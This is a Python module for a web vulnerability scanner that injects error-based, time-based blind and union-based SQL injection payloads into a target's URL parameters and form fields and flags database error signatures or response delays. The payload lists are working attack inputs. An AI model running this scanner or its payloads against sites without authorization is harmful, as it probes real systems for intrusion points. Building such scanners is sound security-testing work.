"""
SQL Injection Scanner Module
Advanced SQL injection vulnerability detection
"""

import logging
import time
import re
import urllib.parse
from typing import Dict, List, Tuple
import requests
from bs4 import BeautifulSoup

logger = logging.getLogger(__name__)


class SQLInjectionScanner:
    """Advanced SQL injection vulnerability scanner"""
    
    # SQL injection payloads for different detection methods
    ERROR_BASED_PAYLOADS = [
        "'",
        "\"",
        "1'",
        "1\"",
        "' OR '1'='1",
        "' OR '1'='1' --",
        "' OR '1'='1' #",
        "' OR '1'='1'/*",
        "admin'--",
        "admin' #",
        "admin'/*",
        "' or 1=1--",
        "' or 1=1#",
        "' or 1=1/*",
        "') or '1'='1--",
        "') or ('1'='1--",
    ]
    
    BLIND_SQLI_PAYLOADS = [
        "' AND SLEEP(5)--",
        "' AND BENCHMARK(5000000,MD5('test'))--",
        "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
        "'; WAITFOR DELAY '0:0:5'--",
        "' AND 1=1--",
        "' AND 1=2--",
    ]
    
    UNION_BASED_PAYLOADS = [
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL,NULL--",
        "' UNION ALL SELECT NULL--",
        "' UNION ALL SELECT NULL,NULL--",
    ]
    
    # Database error signatures
    DB_ERROR_SIGNATURES = {
        'mysql': [
            'SQL syntax.*MySQL',
            'Warning.*mysql_.*',
            'MySQLSyntaxErrorException',
            'valid MySQL result',
            'check the manual that corresponds to your MySQL',
        ],
        'postgresql': [
            'PostgreSQL.*ERROR',
            'Warning.*pg_.*',
            'valid PostgreSQL result',
            'Npgsql\.',
            'PG::SyntaxError:',
        ],
        'mssql': [
            'Driver.*SQL[\-\_\ ]*Server',
            'OLE DB.*SQL Server',
            '\[Microsoft\]\[ODBC SQL Server Driver\]',
            '\[Macromedia\]\[SQLServer JDBC Driver\]',
            '\[SqlException',
        ],
        'oracle': [
            '\bORA-[0-9][0-9][0-9][0-9]',
            'Oracle error',
            'Oracle.*Driver',
            'Warning.*oci_.*',
            'Warning.*ora_.*',
        ],
        'sqlite': [
            'SQLite/JDBCDriver',
            'SQLite.Exception',
            'System.Data.SQLite.SQLiteException',
            'Warning.*sqlite_.*',
            '\[SQLITE_ERROR\]',
        ],
    }
    
    def __init__(self, target_url, timeout=10):
        """
        Initialize SQL Injection Scanner
        
        Args:
            target_url: Target URL to scan
            timeout: Request timeout in seconds
        """
        self.target = target_url
        self.timeout = timeout
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        self.vulnerabilities = []
        self.score = 100
        
    def scan(self) -> Dict:
        """
        Perform comprehensive SQL injection scan
        
        Returns:
            Dict containing scan results
        """
        logger.info(f"Starting SQL injection scan for {self.target}")
        
        try:
            # Find injectable parameters
            forms = self._find_forms()
            url_params = self._extract_url_parameters()
            
            results = {
                'vulnerable': False,
                'vulnerabilities': [],
                'database_type': None,
                'injection_points': [],
                'score': 100,
                'risk_level': 'LOW',
                'details': {}
            }
            
            # Test URL parameters
            if url_params:
                logger.info(f"Testing {len(url_params)} URL parameters")
                for param in url_params:
                    vulns = self._test_parameter_sqli(param)
                    if vulns:
                        results['vulnerabilities'].extend(vulns)
                        results['injection_points'].append(f"URL parameter: {param}")
            
            # Test forms
            if forms:
                logger.info(f"Testing {len(forms)} forms")
                for form in forms:
                    vulns = self._test_form_sqli(form)
                    if vulns:
                        results['vulnerabilities'].extend(vulns)
                        results['injection_points'].append(f"Form: {form.get('action', 'inline')}")
            
            # Update results
            if results['vulnerabilities']:
                results['vulnerable'] = True
                results['database_type'] = self._identify_database_type(results['vulnerabilities'])
                
                # Calculate score based on severity
                critical_count = sum(1 for v in results['vulnerabilities'] if v['severity'] == 'CRITICAL')
                high_count = sum(1 for v in results['vulnerabilities'] if v['severity'] == 'HIGH')
                
                results['score'] = max(0, 100 - (critical_count * 40) - (high_count * 20))
                results['risk_level'] = 'CRITICAL' if critical_count > 0 else 'HIGH'
            
            results['details'] = {
                'forms_found': len(forms),
                'parameters_found': len(url_params),
                'total_tests': len(url_params) + len(forms),
            }
            
            logger.info(f"SQL injection scan completed. Vulnerable: {results['vulnerable']}")
            return results
            
        except Exception as e:
            logger.error(f"SQL injection scan error: {str(e)}")
            return {
                'vulnerable': False,
                'vulnerabilities': [],
                'score': 50,
                'error': str(e)
            }
    
    def _find_forms(self) -> List[Dict]:
        """Find all forms on the target page"""
        try:
            response = self.session.get(self.target, timeout=self.timeout)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            forms = []
            for form in soup.find_all('form'):
                form_data = {
                    'action': form.get('action', ''),
                    'method': form.get('method', 'get').upper(),
                    'inputs': []
                }
                
                for input_tag in form.find_all(['input', 'textarea']):
                    input_name = input_tag.get('name')
                    input_type = input_tag.get('type', 'text')
                    if input_name:
                        form_data['inputs'].append({
                            'name': input_name,
                            'type': input_type
                        })
                
                if form_data['inputs']:
                    forms.append(form_data)
            
            return forms
            
        except Exception as e:
            logger.error(f"Error finding forms: {e}")
            return []
    
    def _extract_url_parameters(self) -> List[str]:
        """Extract parameters from URL"""
        try:
            parsed = urllib.parse.urlparse(self.target)
            params = urllib.parse.parse_qs(parsed.query)
            return list(params.keys())
        except Exception:
            return []
    
    def _test_parameter_sqli(self, param: str) -> List[Dict]:
        """Test a URL parameter for SQL injection"""
        vulnerabilities = []
        
        # Error-based SQLi
        error_vuln = self._test_error_based(param, 'url')
        if error_vuln:
            vulnerabilities.append(error_vuln)
        
        # Blind SQLi
        blind_vuln = self._test_blind_sqli(param, 'url')
        if blind_vuln:
            vulnerabilities.append(blind_vuln)
        
        # Union-based SQLi
        union_vuln = self._test_union_based(param, 'url')
        if union_vuln:
            vulnerabilities.append(union_vuln)
        
        return vulnerabilities
    
    def _test_form_sqli(self, form: Dict) -> List[Dict]:
        """Test a form for SQL injection"""
        vulnerabilities = []
        
        for input_field in form['inputs']:
            # Skip non-text inputs
            if input_field['type'] in ['submit', 'button', 'reset', 'file']:
                continue
            
            # Error-based SQLi
            error_vuln = self._test_error_based_form(form, input_field['name'])
            if error_vuln:
                vulnerabilities.append(error_vuln)
            
            # Blind SQLi
            blind_vuln = self._test_blind_sqli_form(form, input_field['name'])
            if blind_vuln:
                vulnerabilities.append(blind_vuln)
        
        return vulnerabilities
    
    def _test_error_based(self, param: str, location: str) -> Dict:
        """Test for error-based SQL injection"""
        try:
            parsed = urllib.parse.urlparse(self.target)
            params = urllib.parse.parse_qs(parsed.query)
            
            for payload in self.ERROR_BASED_PAYLOADS[:5]:  # Test first 5 payloads
                # Inject payload
                test_params = params.copy()
                test_params[param] = [payload]
                
                test_url = urllib.parse.urlunparse((
                    parsed.scheme,
                    parsed.netloc,
                    parsed.path,
                    parsed.params,
                    urllib.parse.urlencode(test_params, doseq=True),
                    parsed.fragment
                ))
                
                response = self.session.get(test_url, timeout=self.timeout)
                
                # Check for database errors
                db_type = self._detect_db_error(response.text)
                if db_type:
                    return {
                        'type': 'SQL Injection (Error-based)',
                        'severity': 'CRITICAL',
                        'location': location,
                        'parameter': param,
                        'payload': payload,
                        'database': db_type,
                        'description': f'Error-based SQL injection found in {param}. Database type: {db_type}',
                        'evidence': 'Database error message detected in response'
                    }
            
            return None
            
        except Exception as e:
            logger.debug(f"Error testing parameter {param}: {e}")
            return None
    
    def _test_blind_sqli(self, param: str, location: str) -> Dict:
        """Test for blind SQL injection using time-based detection"""
        try:
            parsed = urllib.parse.urlparse(self.target)
            params = urllib.parse.parse_qs(parsed.query)
            
            # Get baseline response time
            baseline_start = time.time()
            self.session.get(self.target, timeout=self.timeout)
            baseline_time = time.time() - baseline_start
            
            # Test time-based payloads
            for payload in self.BLIND_SQLI_PAYLOADS[:3]:
                test_params = params.copy()
                test_params[param] = [payload]
                
                test_url = urllib.parse.urlunparse((
                    parsed.scheme,
                    parsed.netloc,
                    parsed.path,
                    parsed.params,
                    urllib.parse.urlencode(test_params, doseq=True),
                    parsed.fragment
                ))
                
                test_start = time.time()
                try:
                    self.session.get(test_url, timeout=self.timeout + 6)
                    test_time = time.time() - test_start
                    
                    # If response is significantly delayed, likely vulnerable
                    if test_time > (baseline_time + 4):
                        return {
                            'type': 'SQL Injection (Blind/Time-based)',
                            'severity': 'HIGH',
                            'location': location,
                            'parameter': param,
                            'payload': payload,
                            'description': f'Time-based blind SQL injection detected in {param}',
                            'evidence': f'Response delayed by {test_time - baseline_time:.2f} seconds'
                        }
                except requests.Timeout:
                    # Timeout indicates successful delay
                    return {
                        'type': 'SQL Injection (Blind/Time-based)',
                        'severity': 'HIGH',
                        'location': location,
                        'parameter': param,
                        'payload': payload,
                        'description': f'Time-based blind SQL injection detected in {param}',
                        'evidence': 'Request timed out as expected'
                    }
            
            return None
            
        except Exception as e:
            logger.debug(f"Error testing blind SQLi on {param}: {e}")
            return None
    
    def _test_union_based(self, param: str, location: str) -> Dict:
        """Test for union-based SQL injection"""
        try:
            parsed = urllib.parse.urlparse(self.target)
            params = urllib.parse.parse_qs(parsed.query)
            
            # Get original response
            original_response = self.session.get(self.target, timeout=self.timeout)
            original_length = len(original_response.text)
            
            for payload in self.UNION_BASED_PAYLOADS:
                test_params = params.copy()
                test_params[param] = [payload]
                
                test_url = urllib.parse.urlunparse((
                    parsed.scheme,
                    parsed.netloc,
                    parsed.path,
                    parsed.params,
                    urllib.parse.urlencode(test_params, doseq=True),
                    parsed.fragment
                ))
                
                response = self.session.get(test_url, timeout=self.timeout)
                
                # Check for database errors or significant response changes
                db_type = self._detect_db_error(response.text)
                length_diff = abs(len(response.text) - original_length)
                
                if db_type or length_diff > 100:
                    return {
                        'type': 'SQL Injection (Union-based)',
                        'severity': 'CRITICAL',
                        'location': location,
                        'parameter': param,
                        'payload': payload,
                        'description': f'Union-based SQL injection possible in {param}',
                        'evidence': f'Database error detected' if db_type else f'Response length changed significantly'
                    }
            
            return None
            
        except Exception as e:
            logger.debug(f"Error testing union SQLi on {param}: {e}")
            return None
    
    def _test_error_based_form(self, form: Dict, field_name: str) -> Dict:
        """Test form field for error-based SQL injection"""
        try:
            # Build form action URL
            action = form['action']
            if not action.startswith('http'):
                parsed = urllib.parse.urlparse(self.target)
                if action.startswith('/'):
                    action = f"{parsed.scheme}://{parsed.netloc}{action}"
                else:
                    action = urllib.parse.urljoin(self.target, action)
            
            # Test payloads
            for payload in self.ERROR_BASED_PAYLOADS[:3]:
                # Build form data
                form_data = {input_field['name']: 'test' for input_field in form['inputs']}
                form_data[field_name] = payload
                
                if form['method'] == 'POST':
                    response = self.session.post(action, data=form_data, timeout=self.timeout)
                else:
                    response = self.session.get(action, params=form_data, timeout=self.timeout)
                
                # Check for database errors
                db_type = self._detect_db_error(response.text)
                if db_type:
                    return {
                        'type': 'SQL Injection (Error-based)',
                        'severity': 'CRITICAL',
                        'location': 'form',
                        'parameter': field_name,
                        'payload': payload,
                        'database': db_type,
                        'description': f'Error-based SQL injection found in form field {field_name}',
                        'evidence': 'Database error message detected'
                    }
            
            return None
            
        except Exception as e:
            logger.debug(f"Error testing form field {field_name}: {e}")
            return None
    
    def _test_blind_sqli_form(self, form: Dict, field_name: str) -> Dict:
        """Test form field for blind SQL injection"""
        try:
            action = form['action']
            if not action.startswith('http'):
                parsed = urllib.parse.urlparse(self.target)
                if action.startswith('/'):
                    action = f"{parsed.scheme}://{parsed.netloc}{action}"
                else:
                    action = urllib.parse.urljoin(self.target, action)
            
            # Get baseline
            form_data = {input_field['name']: 'test' for input_field in form['inputs']}
            baseline_start = time.time()
            if form['method'] == 'POST':
                self.session.post(action, data=form_data, timeout=self.timeout)
            else:
                self.session.get(action, params=form_data, timeout=self.timeout)
            baseline_time = time.time() - baseline_start
            
            # Test time-based payloads
            for payload in self.BLIND_SQLI_PAYLOADS[:2]:
                form_data[field_name] = payload
                
                test_start = time.time()
                try:
                    if form['method'] == 'POST':
                        self.session.post(action, data=form_data, timeout=self.timeout + 6)
                    else:
                        self.session.get(action, params=form_data, timeout=self.timeout + 6)
                    test_time = time.time() - test_start
                    
                    if test_time > (baseline_time + 4):
                        return {
                            'type': 'SQL Injection (Blind/Time-based)',
                            'severity': 'HIGH',
                            'location': 'form',
                            'parameter': field_name,
                            'payload': payload,
                            'description': f'Time-based blind SQL injection in form field {field_name}',
                            'evidence': f'Response delayed by {test_time - baseline_time:.2f} seconds'
                        }
                except requests.Timeout:
                    return {
                        'type': 'SQL Injection (Blind/Time-based)',
                        'severity': 'HIGH',
                        'location': 'form',
                        'parameter': field_name,
                        'payload': payload,
                        'description': f'Time-based blind SQL injection in form field {field_name}',
                        'evidence': 'Request timed out as expected'
                    }
            
            return None
            
        except Exception as e:
            logger.debug(f"Error testing blind SQLi on form field {field_name}: {e}")
            return None
    
    def _detect_db_error(self, response_text: str) -> str:
        """
        Detect database error messages in response
        
        Returns:
            Database type if error detected, None otherwise
        """
        for db_type, signatures in self.DB_ERROR_SIGNATURES.items():
            for signature in signatures:
                if re.search(signature, response_text, re.IGNORECASE):
                    return db_type.upper()
        return None
    
    def _identify_database_type(self, vulnerabilities: List[Dict]) -> str:
        """Identify database type from vulnerabilities"""
        for vuln in vulnerabilities:
            if 'database' in vuln:
                return vuln['database']
        return 'UNKNOWN'

